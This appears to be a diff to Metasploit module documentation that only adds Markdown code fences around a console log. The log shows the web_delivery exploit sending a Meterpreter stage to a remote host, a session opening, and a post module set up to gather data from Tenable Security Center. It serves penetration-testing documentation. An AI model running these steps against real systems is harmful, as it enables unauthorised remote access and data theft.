@@ -70,7 +70,9 @@ msf exploit(multi/script/web_delivery) >
 [*] Transmitting intermediate stager...(126 bytes)
 [*] Sending stage (3090404 bytes) to 2.2.2.2
 [*] Meterpreter session 1 opened (1.1.1.1:4446 -> 2.2.2.2:52304) at 2026-03-16 08:55:39 -0400
+```
 
+```
 msf exploit(multi/script/web_delivery) > use post/linux/gather/tenable_security_center 
 msf post(linux/gather/tenable_security_center) > set session 1
 session => 1
